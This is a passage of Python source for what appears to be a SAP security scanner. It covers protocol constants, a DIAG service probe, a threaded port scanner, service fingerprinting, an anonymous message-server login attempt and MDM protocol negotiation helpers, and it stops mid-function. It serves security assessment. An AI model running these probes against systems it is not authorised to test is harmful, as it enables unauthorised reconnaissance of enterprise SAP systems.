    "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"
)


def decompress_icm_paths():
    """Decompress the embedded ICM URL paths wordlist."""
    raw = gzip.decompress(base64.b64decode(_ICM_PATHS_B64))
    return [line for line in raw.decode("utf-8").strip().split("\n") if line.strip()]


# SAPMS protocol constants
MS_EYECATCHER = b"**MESSAGE**\x00"
MS_VERSION = 0x04
MS_FLAG_UNKNOWN = 0x00
MS_FLAG_ONE_WAY = 0x01
MS_FLAG_REQUEST = 0x02
MS_FLAG_REPLY = 0x03
MS_IFLAG_SEND_NAME = 0x01
MS_IFLAG_LOGOUT = 0x04
MS_IFLAG_LOGIN_2 = 0x08

MS_OPCODE_SERVER_LST = 5
MS_OPCODE_DUMP_INFO = 30
MS_OPCODE_CHECK_ACL = 71
MS_OPCODE_SERVER_LONG_LIST = 64

MS_DUMP_RELEASE = 8
MS_DUMP_PARAMS = 3
MS_DUMP_ALL_SERVER = 5

MS_OPCODE_ERROR_OK = 0
MS_OPCODE_ERROR_ACCESS_DENIED = 5

# SAPMSClient4 record size
MS_CLIENT4_SIZE = 160

# SAP DIAG protocol constants (based on pysap by Martin Gallo)
# Item types
DIAG_ITEM_SES = 0x01       # Session info (16 bytes fixed)
DIAG_ITEM_ICO = 0x02       # Icon (20 bytes fixed)
DIAG_ITEM_TIT = 0x03       # Title (3 bytes fixed)
DIAG_ITEM_EOM = 0x0c       # End of message (0 bytes)
DIAG_ITEM_APPL = 0x10      # Application (id + sid + 2B length + value)
DIAG_ITEM_APPL4 = 0x12     # Application4 (id + sid + 4B length + value)

# Fixed sizes for non-APPL item types
DIAG_ITEM_SIZES = {
    0x01: 16, 0x02: 20, 0x03: 3, 0x07: 76, 0x08: 0,
    0x09: 22, 0x0a: 3, 0x0b: 2, 0x0c: 0, 0x13: 2, 0x15: 36,
}

# APPL IDs
DIAG_APPL_ST_USER = 0x04
DIAG_APPL_ST_R3INFO = 0x06
DIAG_APPL_DYNT = 0x09
DIAG_APPL_VARINFO = 0x0c

# ST_R3INFO SIDs of interest
DIAG_R3INFO_DBNAME = 0x02
DIAG_R3INFO_CPUNAME = 0x03
DIAG_R3INFO_CLIENT = 0x0c
DIAG_R3INFO_KERNEL_VERSION = 0x29

# VARINFO SIDs of interest
DIAG_VARINFO_SESSION_TITLE = 0x09
DIAG_VARINFO_SESSION_ICON = 0x0a

# ST_USER SIDs
DIAG_USER_CONNECT = 0x02
DIAG_USER_SUPPORTDATA = 0x0b

# Additional ST_R3INFO SIDs
DIAG_R3INFO_GUI_THEME = 0x25
DIAG_R3INFO_TCODE = 0x07
DIAG_R3INFO_DYNPRONAME = 0x0d

# Human-readable names for extracted DIAG fields
DIAG_FIELD_NAMES = {
    (DIAG_APPL_ST_R3INFO, DIAG_R3INFO_DBNAME): "DBNAME",
    (DIAG_APPL_ST_R3INFO, DIAG_R3INFO_CPUNAME): "CPUNAME",
    (DIAG_APPL_ST_R3INFO, DIAG_R3INFO_CLIENT): "CLIENT",
    (DIAG_APPL_ST_R3INFO, DIAG_R3INFO_KERNEL_VERSION): "KERNEL_VERSION",
    (DIAG_APPL_ST_R3INFO, DIAG_R3INFO_GUI_THEME): "GUI_THEME",
    (DIAG_APPL_VARINFO, DIAG_VARINFO_SESSION_TITLE): "SESSION_TITLE",
    (DIAG_APPL_VARINFO, DIAG_VARINFO_SESSION_ICON): "SESSION_ICON",
}

# GUI language codes (from pysap)
DIAG_GUI_LANG = {
    "0": "Serbian", "1": "Chinese", "2": "Thai", "3": "Korean",
    "4": "Romanian", "5": "Slovenian", "6": "Croatian", "7": "Malaysian",
    "8": "Ukrainian", "9": "Estonian", "A": "Arabic", "B": "Hebrew",
    "C": "Czech", "D": "German", "E": "English", "F": "French",
    "G": "Greek", "H": "Hungarian", "I": "Italian", "J": "Japanese",
    "K": "Danish", "L": "Polish", "M": "trad. Chinese", "N": "Dutch",
    "O": "Norwegian", "P": "Portuguese", "Q": "Slovakian", "R": "Russian",
    "S": "Spanish", "T": "Turkish", "U": "Finnish", "V": "Swedish",
    "W": "Bulgarian", "X": "Lithuanian", "Y": "Latvian", "a": "Afrikaans",
    "b": "Icelandic", "c": "Catalan", "d": "Latin", "i": "Indonesian",
}

# Support data bitmask for SAP GUI 7.02 Java 5 (from pysap, default for init)
DIAG_SUPPORT_DATA = bytes.fromhex(
    "ff7ffe2ddab737d674087e1305971597eff23f8d0770ff0f0000000000000000"
)

# SAP DIAG service probe (from nmap-sap/nmap-service-probes by gelim/erpscan).
# Full NI-framed DIAG initialization packet used to fingerprint SAP Dispatcher.
SAP_DIAG_PROBE = bytes.fromhex(
    "00000106ffffffff0a000000000000ffffffffffffffffffffffffffffffffffff"
    "ff3e00000000ffffffffffff20202020202020202020202020202020202020202020"
    "2020202020202020202020202020202020200000000000000000000000000000000000"
    "000000000000000020202020202020202020202020202020202020200000000000000000"
    "ffffffff0000000001000000000000000000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000000000000000000000000010"
    "000000000000100402000c000000800000044c0000138910040b0020ff7ffe2d"
    "dab737d674087e1305971597eff23f8d0770ff0f0000000000000000"
)

# Softmatch pattern from nmap-sap: response starts with NI header + DIAG marker.
# Raw TCP: \x00\x00..\x00\x00\x11\x00\x00\x01\x00\x00  (12 bytes minimum)
SAP_DIAG_RESP_RE = re.compile(
    b'^\\x00\\x00..\\x00\\x00\\x11\\x00\\x00\\x01\\x00\\x00', re.DOTALL
)


class Severity(IntEnum):
    CRITICAL = 0
    HIGH = 1
    MEDIUM = 2
    LOW = 3
    INFO = 4


SEVERITY_COLORS = {
    Severity.CRITICAL: "#e74c3c",
    Severity.HIGH: "#e67e22",
    Severity.MEDIUM: "#f1c40f",
    Severity.LOW: "#3498db",
    Severity.INFO: "#95a5a6",
}

SEVERITY_NAMES = {
    Severity.CRITICAL: "CRITICAL",
    Severity.HIGH: "HIGH",
    Severity.MEDIUM: "MEDIUM",
    Severity.LOW: "LOW",
    Severity.INFO: "INFO",
}


@dataclass
class Finding:
    name: str
    severity: Severity
    description: str
    remediation: str = ""
    detail: str = ""
    port: int = 0

    def to_dict(self):
        d = {
            "name": self.name,
            "severity": SEVERITY_NAMES[self.severity],
            "description": self.description,
            "remediation": self.remediation,
            "detail": self.detail,
            "port": self.port,
        }
        return d


@dataclass
class SAPInstance:
    host: str
    ip: str
    instance_nr: str
    ports: Dict[int, str] = field(default_factory=dict)
    services: Dict[str, dict] = field(default_factory=dict)
    info: Dict[str, str] = field(default_factory=dict)
    findings: List[Finding] = field(default_factory=list)
    url_scan_results: List[dict] = field(default_factory=list)

    def to_dict(self):
        return {
            "host": self.host,
            "ip": self.ip,
            "instance_nr": self.instance_nr,
            "ports": {str(k): v for k, v in self.ports.items()},
            "services": self.services,
            "info": self.info,
            "findings": [f.to_dict() for f in self.findings],
            "url_scan_results": self.url_scan_results,
        }


@dataclass
class SAPSystem:
    sid: str = "UNKNOWN"
    instances: List[SAPInstance] = field(default_factory=list)
    hostname: str = ""
    kernel: str = ""
    system_type: str = ""
    relationships: List[dict] = field(default_factory=list)

    def highest_severity(self) -> Optional[Severity]:
        sev = None
        for inst in self.instances:
            for f in inst.findings:
                if sev is None or f.severity < sev:
                    sev = f.severity
        return sev

    def all_findings(self) -> List[Finding]:
        findings = []
        for inst in self.instances:
            findings.extend(inst.findings)
        return findings

    def to_dict(self):
        return {
            "sid": self.sid,
            "hostname": self.hostname,
            "kernel": self.kernel,
            "system_type": self.system_type,
            "instances": [i.to_dict() for i in self.instances],
            "relationships": self.relationships,
        }


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2: SAP NI Protocol Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def ni_send(sock, data):
    """Send payload with 4-byte big-endian length prefix (SAP NI framing)."""
    sock.sendall(struct.pack("!I", len(data)) + data)


def ni_recv(sock, timeout=10):
    """Receive one SAP NI frame: 4-byte length prefix + payload."""
    sock.settimeout(timeout)
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            raise ConnectionError("Connection closed reading NI header")
        hdr += chunk
    length = struct.unpack("!I", hdr)[0]
    if length > 0x200000:
        raise ValueError("NI frame too large: %d bytes" % length)
    data = b""
    while len(data) < length:
        chunk = sock.recv(min(length - len(data), 65536))
        if not chunk:
            raise ConnectionError("Connection closed reading NI payload")
        data += chunk
    return data


def pad_right(s, length, pad_char=b" "):
    """Pad string/bytes to fixed length."""
    if isinstance(s, str):
        s = s.encode("ascii")
    if isinstance(pad_char, str):
        pad_char = pad_char.encode("ascii")
    if len(s) >= length:
        return s[:length]
    return s + pad_char * (length - len(s))


def pad_right_null(s, length):
    return pad_right(s, length, b"\x00")


def ip_to_bytes(ip_str):
    """Convert dotted-quad IP to 4 bytes."""
    return socket.inet_aton(ip_str)


def extract_ascii_strings(data, min_len=3):
    """Extract printable ASCII strings from binary data."""
    strings = []
    current = ""
    for b in data:
        if 32 <= b <= 126:
            current += chr(b)
        else:
            if len(current) >= min_len:
                strings.append(current)
            current = ""
    if len(current) >= min_len:
        strings.append(current)
    return strings


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3: Port Scanner
# ═══════════════════════════════════════════════════════════════════════════════

def scan_port(host, port, timeout=3):
    """Check if a TCP port is open. Returns (port, True/False)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return (port, result == 0)
    except (socket.error, OSError):
        return (port, False)


def verify_sap_diag(host, port, timeout=3):
    """Verify a port is actually SAP DIAG by sending the nmap-sap DIAG probe.

    Sends the SAP DIAG initialization packet (from nmap-sap/nmap-service-probes
    by gelim/erpscan) and checks whether the response matches the SAP Dispatcher
    softmatch signature: NI header followed by DIAG marker bytes 00 00 11 00.

    Returns True if the response matches, False otherwise.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(SAP_DIAG_PROBE)
        # Read enough bytes to match the 12-byte signature
        resp = b""
        try:
            while len(resp) < 512:
                chunk = s.recv(512)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return len(resp) >= 12 and SAP_DIAG_RESP_RE.match(resp) is not None
    except Exception:
        return False


def build_port_list(instances, quick=False):
    """Build list of (port, service_name) tuples for given instance range.

    If quick=True, only generate dispatcher (32NN), gateway (33NN),
    SAPControl (5NN13), and SAPHostControl (1128/1129) ports for fast
    pre-scanning to identify SAP hosts.
    """
    ports = []
    for inst_nr in instances:
        inst_str = "%02d" % inst_nr
        if quick:
            # Quick mode: dispatcher, gateway, J2EE HTTP, and SAPControl ports
            # SAPControl/J2EE are included to detect Java-only instances without DIAG/GW
            for svc_name in ("dispatcher", "gateway"):
                base, desc = SAP_PORTS[svc_name]
                port = base + inst_nr
                if port not in NON_SAP_PORTS:
                    ports.append((port, svc_name, inst_str, desc))
            # J2EE HTTP (5NN00) - key port for Java systems and CVE checks
            j2ee_port = 50000 + inst_nr * 100
            ports.append((j2ee_port, "j2ee_http", inst_str, "J2EE HTTP"))
            # SAPControl HTTP (5NN13) - unique to SAP, detects Java-only systems
            sc_port = 50000 + inst_nr * 100 + 13
            ports.append((sc_port, "sapcontrol", inst_str, "SAPControl SOAP (HTTP)"))
        else:
            for svc_name, (base, desc) in SAP_PORTS.items():
                if svc_name == "sapcontrol":
                    port = 50000 + inst_nr * 100 + 13
                elif svc_name == "sapcontrol_s":
                    port = 50000 + inst_nr * 100 + 14
                elif svc_name == "j2ee_http":
                    port = 50000 + inst_nr * 100
                elif svc_name == "j2ee_https":
                    port = 50000 + inst_nr * 100 + 1
                else:
                    port = base + inst_nr
                if port in NON_SAP_PORTS:
                    continue
                # Skip instance-derived ports that collide with fixed ports
                # e.g. ICM HTTP base 8000 + instance 80 = 8080, which is SAP_FIXED_PORTS
                if port in SAP_FIXED_PORTS:
                    continue
                ports.append((port, svc_name, inst_str, desc))
            # Scan 5XXYY ports for offsets 02-12 (00,01,13,14 already covered above)
            for offset in range(2, 13):
                p = 50000 + inst_nr * 100 + offset
                if p not in NON_SAP_PORTS and p not in SAP_FIXED_PORTS:
                    ports.append((p, "sap_5xx", inst_str, "SAP 5%02d%02d" % (inst_nr, offset)))
            # Also scan MS internal port +1 (3901 for instance 00)
            ms_alt = 3900 + inst_nr + 1
            if ms_alt not in NON_SAP_PORTS and ms_alt not in SAP_FIXED_PORTS:
                ports.append((ms_alt, "ms_internal", inst_str, "Message Server Internal (+1)"))
            # HANA SQL ports: 3NN13 (SystemDB), 3NN15 (first tenant)
            hana_sysdb = 30000 + inst_nr * 100 + 13
            hana_tenant = 30000 + inst_nr * 100 + 15
            for hp, hdesc in ((hana_sysdb, "HANA SQL SystemDB"),
                              (hana_tenant, "HANA SQL Tenant")):
                if hp not in NON_SAP_PORTS and hp not in SAP_FIXED_PORTS:
                    ports.append((hp, "hana_sql", inst_str, hdesc))
    if quick:
        # Also probe fixed ports to detect hosts that only expose
        # HostControl, BusinessObjects, Router, or Content Server
        ports.append((1128, "fixed", "XX", "SAPHostControl HTTP"))
        ports.append((1129, "fixed", "XX", "SAPHostControl HTTPS"))
        ports.append((6400, "bo_cms", "XX", "SAP BusinessObjects CMS"))
        ports.append((8080, "fixed", "XX", "SAP Web (alt HTTP)"))
        ports.append((3299, "saprouter", "XX", "SAP Router"))
        ports.append((1090, "content_server", "XX", "SAP Content Server HTTP"))
    else:
        # Add fixed ports
        for port, desc in SAP_FIXED_PORTS.items():
            ports.append((port, "fixed", "XX", desc))
    return ports


def scan_sap_ports(host, instances, timeout=3, threads=20, verbose=False,
                   progress_callback=None, quick=False, cancel_check=None):
    """Scan SAP ports for a single host. Returns dict of port -> {service, instance, desc}."""
    port_list = build_port_list(instances, quick=quick)
    unique_ports = {}
    for port, svc, inst, desc in port_list:
        if port not in unique_ports:
            unique_ports[port] = (svc, inst, desc)

    # Use fewer threads for prescan to avoid overwhelming SAP dispatchers
    scan_threads = min(threads, 10) if quick else threads
    open_ports = {}
    with ThreadPoolExecutor(max_workers=scan_threads) as executor:
        futures = {executor.submit(scan_port, host, p, timeout): p for p in unique_ports}
        for future in as_completed(futures):
            if cancel_check and cancel_check():
                for f in futures:
                    f.cancel()
                break
            port, is_open = future.result()
            if progress_callback:
                progress_callback()
            if is_open:
                svc, inst, desc = unique_ports[port]
                open_ports[port] = {
                    "service": svc,
                    "instance": inst,
                    "description": desc,
                }
                if verbose:
                    log_verbose("  Port %d open (%s)" % (port, desc))

    # Verify DIAG ports (3200-3299) with the SAP DIAG protocol probe
    # Skip verification in quick mode - it's a liveness pre-scan only;
    # the full scan will verify properly without parallel interference
    if not quick:
        diag_ports = [p for p in open_ports if 3200 <= p <= 3299
                      and p not in SAP_FIXED_PORTS]
        if diag_ports:
            # Let the dispatcher recover from the connection flood before probing
            time.sleep(2)
        for port in diag_ports:
            if not verify_sap_diag(host, port, timeout):
                # Retry with increasing delays to let the dispatcher recover
                for delay in (1, 2):
                    time.sleep(delay)
                    if verify_sap_diag(host, port, timeout):
                        break
                else:
                    if verbose:
                        log_verbose("  Port %d open but not SAP DIAG (probe mismatch), removing" % port)
                    del open_ports[port]

    return open_ports


def deduce_instance(port):
    """Try to deduce SAP instance number from port number."""
    # Fixed ports are not instance-derived; skip them
    if port in SAP_FIXED_PORTS or port in NON_SAP_PORTS:
        return "XX"
    # Match ports within the full SAP instance range (00-99)
    if 3200 <= port <= 3299:
        return "%02d" % (port - 3200)
    if 3300 <= port <= 3399:
        return "%02d" % (port - 3300)
    if 3900 <= port <= 3999:
        return "%02d" % (port - 3900)
    if 8000 <= port <= 8099:
        return "%02d" % (port - 8000)
    if 4300 <= port <= 4399:
        return "%02d" % (port - 4300)
    if 8100 <= port <= 8199:
        return "%02d" % (port - 8100)
    if 50000 <= port <= 59999:
        inst = (port - 50000) // 100
        if inst <= 99:
            return "%02d" % inst
    return "XX"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4: Service Fingerprinting
# ═══════════════════════════════════════════════════════════════════════════════

def fingerprint_gateway(host, port, timeout=3):
    """Fingerprint a SAP Gateway port using SAPRFC v3 NOOP monitor command."""
    info = {"type": "gateway", "accessible": False}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # SAPRFC v3 MONITOR NOOP (version=3, req_type=9, cmd=1)
        pkt = bytearray(64)
        pkt[0] = 0x03  # version=3
        pkt[1] = 0x09  # req_type=9 (MONITOR)
        pkt[2] = 0x01  # cmd=1 (NOOP)
        ni_send(sock, bytes(pkt))
        resp = ni_recv(sock, timeout)
        # Even a 0-length response means the gateway is accessible
        info["accessible"] = True
        info["response_len"] = len(resp)
        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return info


def _ms_try_ssl(host, port, timeout=3):
    """Probe whether a port speaks TLS (SAP secure communications).

    Returns dict with ssl info if TLS is detected, None otherwise.
    When system/secure_communications is enabled, the MS internal port
    requires mutual TLS with a SAP-signed client certificate.
    """
    raw = None
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(timeout)
        raw.connect((host, port))
        try:
            sock = ctx.wrap_socket(raw)
            # Handshake succeeded — SSL without mandatory client cert
            sock.close()
            return {"ssl": True, "mtls_required": False}
        except ssl.SSLError as e:
            try:
                raw.close()
            except Exception:
                pass
            raw = None
            err = str(e).lower()
            # handshake_failure (alert 40) = server requires client cert
            # certificate_unknown (alert 46) = server rejected our cert
            if "handshake_failure" in err or "certificate" in err:
                return {"ssl": True, "mtls_required": True}
            return None
    except Exception:
        if raw:
            try:
                raw.close()
            except Exception:
                pass
        return None


def fingerprint_ms_internal(host, port, timeout=3):
    """Try anonymous MS_LOGIN_2 on a message server internal port.

    If plain TCP fails with a connection reset (indicating the port requires
    SSL), falls back to an SSL probe to detect SAP secure communications.
    """
    info = {"type": "ms_internal", "accessible": False}
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        login_pkt = build_ms_login_anon()
        ni_send(sock, login_pkt)
        resp = ni_recv(sock, timeout)

        if len(resp) >= 12 and resp[:12] == MS_EYECATCHER:
            info["accessible"] = True
            # Check flag byte for reply
            if len(resp) > 55:
                flag = resp[55]
                if flag == MS_FLAG_REPLY:
                    info["login_ok"] = True
        sock.close()
    except (ConnectionResetError, ConnectionError):
        # Plain TCP rejected — probe for SSL (system/secure_communications)
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        ssl_info = _ms_try_ssl(host, port, timeout)
        if ssl_info:
            info["accessible"] = True
            info["ssl"] = True
            info["mtls_required"] = ssl_info.get("mtls_required", False)
    except Exception:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
    return info


def fingerprint_icm(host, port, timeout=3, use_ssl=False):
    """Fingerprint ICM HTTP(S) port."""
    info = {"type": "icm", "accessible": False}
    scheme = "https" if use_ssl else "http"
    try:
        r = requests.get(
            "%s://%s:%d/" % (scheme, host, port),
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        info["accessible"] = True
        info["status_code"] = r.status_code
        info["server"] = r.headers.get("server", "")
        if ("SAP" in info["server"] or "ICM" in info["server"]
                or "Cloud Connector" in info["server"]):
            info["is_sap"] = True
        # Detect "Illegal SSL request" - port requires SSL but we connected via HTTP
        if not use_ssl and r.status_code == 400:
            body = r.text[:2000].lower()
            if "illegal ssl" in body or "ssslerr_no_ssl_request" in body:
                info["ssl_required"] = True
    except RequestException:
        pass
    return info


def fingerprint_sapcontrol(host, port, timeout=3, use_ssl=False):
    """Fingerprint SAPControl SOAP port."""
    info = {"type": "sapcontrol", "accessible": False}
    scheme = "https" if use_ssl else "http"
    try:
        r = requests.get(
            "%s://%s:%d/" % (scheme, host, port),
            timeout=timeout,
            verify=False,
        )
        info["accessible"] = True
        info["status_code"] = r.status_code
        if "SAPControl" in r.text or "sapcontrol" in r.text.lower():
            info["is_sapcontrol"] = True
    except RequestException:
        pass
    return info


def fingerprint_dispatcher(host, port, timeout=3):
    """Fingerprint a SAP Dispatcher (DIAG) port.

    Sends an NI-framed DIAG initialization packet and checks whether the
    response contains a DP header (first byte 0xFF) or a valid DIAG mode
    byte, confirming the port runs the DIAG protocol. This distinguishes
    real DIAG ports from other services (e.g. Enqueue) in the 32XX range.
    """
    info = {"type": "dispatcher", "accessible": False}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        init_pkt = build_diag_init_packet()
        ni_send(sock, init_pkt)
        resp = ni_recv(sock, timeout)
        sock.close()
        if resp and len(resp) >= 16:
            # DP header starts with 0xFF, or raw DIAG response with mode byte
            if resp[0] == 0xFF or (len(resp) >= 8 and resp[0] in (0x00, 0x01)):
                info["accessible"] = True
    except Exception:
        pass
    return info


# ---------------------------------------------------------------------------
# MDM protocol constants — interface CRCs across MDM versions
# (from binary analysis of CLIX.exe, MDS.exe, MDIS.exe)
# ---------------------------------------------------------------------------

MDM_MAGIC = b'\x69\x12\x94\xa2'
MDM_IDENT = b'\x69\x32\x41'

# All unique CRCs found across MDM binaries
MDM_KNOWN_CRCS = [
    (0x054f58ee, 'MDM 7.1.21 primary'),
    (0x646e35f0, 'MDM 7.1.21 secondary'),
    (0xd92079cf, 'MDM 7.1.21 v2'),
    (0x82072e43, 'MDM 7.1.16 primary'),
    (0x5bed2b5c, 'MDM 7.1.16 secondary'),
    (0x8ce88d20, 'MDM 7.1.16 v5'),
    (0x83381ec1, 'MDM shared v3'),
    (0x24ec5073, 'MDM shared v4'),
    (0x1d725db0, 'MDM shared v1'),
    (0xa71ed79d, 'MDIS 7.1.16+'),
]

# Known primary/secondary CRC pairs for MDS negotiation
MDM_CRC_PAIRS = [
    (0x054f58ee, 0x646e35f0, 'MDM 7.1.21'),
    (0x82072e43, 0x5bed2b5c, 'MDM 7.1.16'),
    (0xd92079cf, 0x646e35f0, 'MDM 7.1.21 alt'),
    (0x83381ec1, 0x24ec5073, 'MDM shared'),
    (0x8ce88d20, 0x1d725db0, 'MDM 7.1.16 alt'),
    (0x1d725db0, 0x83381ec1, 'MDM legacy'),
    (0x24ec5073, 0x83381ec1, 'MDM legacy alt'),
]


def _mdm_build_pkt(band, payload):
    """Build an MDM wire-protocol packet."""
    return MDM_MAGIC + bytes([band]) + MDM_IDENT + struct.pack('<I', len(payload)) + payload


def _mdm_build_cmd(cmd_type, cmd_id, crc, extra=b''):
    """Build an MDM command payload."""
    return struct.pack('<HHI', cmd_type, cmd_id, crc) + extra


def _mdm_parse_resp(data):
    """Parse an MDM response packet, return payload or None."""
    if not data or len(data) < 12 or data[:4] != MDM_MAGIC:
        return None
    msg_len = struct.unpack('<I', data[8:12])[0]
    return data[12:12 + msg_len] if len(data) >= 12 + msg_len else data[12:]


def _mdm_parse_string(data, offset):
    """Parse MDM string: [4B len][4B alloc][6B sid_prefix][len B string]."""
    if offset + 8 > len(data):
        return None
    str_len = struct.unpack_from('<I', data, offset)[0]
    str_start = offset + 8 + 6
    str_end = str_start + str_len
    if str_end > len(data):
        return None
    sid_prefix = data[offset + 8:str_start]
    string_val = data[str_start:str_end]
    return sid_prefix, string_val


def _mdm_try_crc_pair(host, port, primary_crc, secondary_crc, timeout):
    """Try a specific CRC pair for MDS negotiation and version extraction.

